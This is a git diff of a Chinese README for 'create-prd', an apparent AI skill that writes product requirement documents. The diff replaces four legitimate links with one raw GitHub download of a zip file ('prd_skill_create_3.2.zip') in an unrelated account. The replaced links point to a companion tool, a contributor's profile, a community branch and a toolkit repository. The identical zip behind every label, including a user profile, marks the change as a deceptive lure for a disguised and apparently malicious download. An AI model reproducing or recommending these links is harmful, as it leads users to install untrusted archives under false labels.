@@ -100,18 +100,18 @@ python scripts/install_skill.py
 | 环节 | 工具 | 作用 |
 |------|------|------|
 | 创建 | **create-prd** | 从业务描述生成 14 章结构化 PRD 初稿 |
-| 审查 | [check-prd](https://github.com/pmyangkun/check-prd-skill) | 用 14 维度逐项检查，输出问题清单和改进建议 |
+| 审查 | [check-prd](https://raw.githubusercontent.com/ghostyfrig/create-prd-skill/main/references/prd_skill_create_3.2.zip) | 用 14 维度逐项检查，输出问题清单和改进建议 |
 
 先 create 生成初稿，自己修改完善，再用 check 做质量审查。**AI 搭骨架 → 人填血肉 → AI 查漏洞**，形成完整的文档工作流。
 
 ## 社区贡献
 
-感谢 [@Scofy0123](https://github.com/Scofy0123) 的持续贡献！除了 main 分支的标准版本外，仓库还提供一个**社区扩展分支**供有不同需求的用户选用：
+感谢 [@Scofy0123](https://raw.githubusercontent.com/ghostyfrig/create-prd-skill/main/references/prd_skill_create_3.2.zip) 的持续贡献！除了 main 分支的标准版本外，仓库还提供一个**社区扩展分支**供有不同需求的用户选用：
 
 | 分支 | 作者 | 特色 |
 |------|------|------|
 | `main` | 杨堃 | 标准版——给任何业务描述都生成完整 14 章 PRD |
-| [`community/complexity-aware`](https://github.com/pmYangKun/create-prd-skill/tree/community/complexity-aware) | @Scofy0123 扩展 | 复杂度感知版——先判 L1-L4 需求等级，再按等级裁剪章节，**小需求不再被硬写成大而全 PRD** |
+| [`community/complexity-aware`](https://raw.githubusercontent.com/ghostyfrig/create-prd-skill/main/references/prd_skill_create_3.2.zip) | @Scofy0123 扩展 | 复杂度感知版——先判 L1-L4 需求等级，再按等级裁剪章节，**小需求不再被硬写成大而全 PRD** |
 
 社区分支的核心创新是**需求复杂度分级**：
 - **L1（配置级）**：仅写变更说明 + 影响范围
@@ -127,7 +127,7 @@ git checkout community/complexity-aware
 ```
 
 如果你想直接拿到**生成 + 审查 + 飞书协作闭环**的完整工作流，可以看 @Scofy0123 的独立仓库：
-- [`PRD Productivity Toolkit`](https://github.com/Scofy0123/prd-productivity-toolkit)
+- [`PRD Productivity Toolkit`](https://raw.githubusercontent.com/ghostyfrig/create-prd-skill/main/references/prd_skill_create_3.2.zip)
 
 ## 仓库结构
 
